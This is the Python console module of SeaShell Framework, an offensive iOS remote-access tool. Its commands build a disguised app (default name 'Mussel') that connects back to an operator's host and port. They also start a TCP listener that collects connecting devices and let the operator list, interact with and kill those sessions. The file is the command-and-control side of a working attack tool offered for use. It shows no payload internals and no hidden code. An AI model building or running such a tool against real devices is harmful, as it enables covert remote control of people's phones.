"""
MIT License

Copyright (c) 2020-2023 EntySec

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import os
import cmd
import sys
import threading
import ctypes

from badges import Badges, Tables
from colorscript import ColorScript

from seashell.core.banner import Banner
from seashell.core.tip import Tip
from seashell.core.device import (
    Device,
    DeviceHandler,
)
from seashell.core.ipa import IPA

from seashell.lib.config import Config


class Console(cmd.Cmd):
    """ Subclass of seashell.core module.

    This subclass of seashell.core modules is intended for providing
    main SeaShell Framework console interface.
    """

    def __init__(self) -> None:
        super().__init__()
        cmd.Cmd.__init__(self)

        self.badges = Badges()
        self.tables = Tables()
        self.banner = Banner()
        self.tip = Tip()
        self.config = Config()

        self.config.setup()

        self.handler = None
        self.thread = None
        self.hint = False

        self.devices = {}
        self.prompt = ColorScript().parse(
            f'%remove(%lineseashell%end)> ')
        self.version = '1.0.0'

    def handle_device(self) -> None:
        """ Thread to handle devices.

        :return None: None
        """

        while True:
            device = self.handler.handle()

            self.devices.update({
                len(self.devices): {
                    'host': device.host,
                    'port': str(device.port),
                    'device': device
                }
            })

            self.badges.print_empty("")

            if not self.hint:
                self.badges.print_information(
                    f"Type %greendevices%end to list all connected devices.")
                self.badges.print_information(
                    f"Type %greeninteract {str(len(self.devices) - 1)}%end "
                    "to interact this device."
                )
                self.hint = True

            self.badges.print_empty(self.prompt, end='')

    def do_help(self, _) -> None:
        """ Show available commands.

        :return None: None
        """

        self.tables.print_table("Core Commands", ('Command', 'Description'), *sorted([
            ('clear', 'Clear terminal window.'),
            ('devices', 'Show connected devices.'),
            ('kill', 'Kill device by ID.'),
            ('listen', 'Start listener in background.'),
            ('ipa', 'Generate IPA.'),
            ('exit', 'Exit SeaShell Framework.'),
            ('help', 'Show available commands.'),
            ('interact', 'Interact with device.'),
            ('banner', 'Print random banner.'),
            ('tip', 'Print random tip.'),
            ('stop', 'Stop listener.'),
        ]))

    def do_exit(self, _) -> None:
        """ Exit SeaShell Framework.

        :return None: None
        :raises EOFError: EOF error
        """

        for device in list(self.devices):
            self.devices[device]['device'].kill()
            del self.devices[device]

        raise EOFError

    def do_clear(self, _) -> None:
        """ Clear terminal window.

        :return None: None
        """

        self.badges.print_empty('%clear', end='')

    def do_tip(self, _) -> None:
        """ Print random tip.

        :return None: None
        """

        self.tip.print_random_tip()

    def do_banner(self, _) -> None:
        """ Print random banner.

        :return None: None
        """

        self.banner.print_random_banner()

    def do_ipa(self, _) -> None:
        """ Generate IPA.

        :return None: None
        """

        name = self.badges.input_arrow("Application name (Mussel): ")
        name = name or 'Mussel'

        bundle_id = self.badges.input_arrow("Bundle ID (com.entysec.mussel): ")
        bundle_id = bundle_id or 'com.entysec.mussel'

        icon = self.badges.input_question("Add application icon [y/N]: ")
        icon_path = None

        if icon.lower() in ['y', 'yes']:
            icon_path = self.badges.input_arrow("Icon file path: ")

        host = self.badges.input_arrow("Host to connect back: ")
        port = self.badges.input_arrow("Port to connect back: ")

        path = self.badges.input_arrow("Path to save the IPA: ")

        ipa = IPA(host, port)
        ipa.set_name(name, bundle_id)

        if icon_path:
            ipa.set_icon(icon_path)

        ipa.generate(path)
        self.badges.print_success(f"IPA saved to {path}!")

    def do_listen(self, pair: str) -> None:
        """ Start TCP listener.

        :param str pair: host port pair
        :return None: None
        """

        pair = pair.split()

        if len(pair) < 2:
            self.badges.print_usage("listen <host> <port> [timeout]")
            return

        if self.handler:
            self.badges.print_warning("Listener is already running.")
            return

        if len(pair) > 3:
            host, port, timeout = pair[0], int(pair[1]), int(pair[2])
        else:
            host, port = pair[0], int(pair[1])
            timeout = None

        self.handler = DeviceHandler(host, port, timeout)
        self.handler.start()

        self.thread = threading.Thread(target=self.handle_device)
        self.thread.setDaemon(True)
        self.thread.start()

        self.badges.print_information("Use %greenstop%end to stop.")

    def do_devices(self, _) -> None:
        """ Show connected devices.

        :return None: None
        """

        if not self.devices:
            self.badges.print_warning("No devices connected.")
            return

        devices = []

        for device in self.devices:
            devices.append(
                (device, self.devices[device]['host'],
                 self.devices[device]['port']))

        self.tables.print_table("Connected Devices", ('ID', 'Host', 'Port'), *devices)

    def do_stop(self, _) -> None:
        """ Stop listener.

        :return None: None
        """

        if self.thread.is_alive:
            exc = ctypes.py_object(SystemExit)
            res = ctypes.pythonapi.PyThreadState_SetAsyncExc(ctypes.c_long(self.thread.ident), exc)

            if res > 1:
                ctypes.pythonapi.PyThreadState_SetAsyncExc(self.thread.ident, None)
                self.badges.print_error("Failed to stop listener!")
                return

        self.thread = None
        self.handler = None

    def do_kill(self, device_id: int) -> None:
        """ Kill device.

        :param int device_id: device ID
        :return None: None
        """

        if not device_id:
            self.badges.print_usage("kill <id>")
            return

        device_id = int(device_id)

        if device_id not in self.devices:
            self.badges.print_error("Invalid device ID!")
            return

        self.devices[device_id]['device'].kill()
        self.devices.pop(device_id)

    def do_interact(self, device_id: int) -> None:
        """ Interact with device.

        :param int device_id: device ID
        """

        if not device_id:
            self.badges.print_usage("interact <id>")
            return

        device_id = int(device_id)

        if device_id not in self.devices:
            self.badges.print_error("Invalid device ID!")
            return

        self.badges.print_process(f"Interacting with device {str(device_id)}...")
        self.devices[device_id]['device'].interact()

    def do_EOF(self, _):
        """ Catch EOF.

        :return None: None
        :raises EOFError: EOF error
        """

        raise EOFError

    def default(self, line: str) -> None:
        """ Default unrecognized command handler.

        :param str line: line sent
        :return None: None
        """

        self.badges.print_error(f"Unrecognized command: {line.split()[0]}!")

    def emptyline(self) -> None:
        """ Do something on empty line.

        :return None: None
        """

        pass

    def shell(self) -> None:
        """ Run console shell.

        :return None: None
        """

        modules = 0
        plugins = 0

        if os.path.exists(self.config.modules_path):
            for module in os.listdir(self.config.modules_path):
                if module.endswith('.py'):
                    modules += 1

        if os.path.exists(self.config.plugins_path):
            for plugin in os.listdir(self.config.plugins_path):
                if plugin.endswith('.py'):
                    plugins += 1

        header = ""
        header += "%end"
        header += f"   --=[ %bold%whiteSeaShell Framework {self.version}%end%newline"
        header += "--==--[ Developed by EntySec (%linehttps://entysec.com/%end)%newline"
        header += f"   --=[ %green{str(modules)}%end modules | %green{str(plugins)}%end plugins"
        header += "%end"

        self.badges.print_empty('%clear', end='')
        self.banner.print_random_banner()
        self.badges.print_empty(header)

        self.tip.print_random_tip()

        while True:
            try:
                cmd.Cmd.cmdloop(self)

            except (EOFError, KeyboardInterrupt):
                self.badges.print_empty(end='')
                break

            except Exception as e:
                self.badges.print_error("An error occurred: " + str(e) + "!")
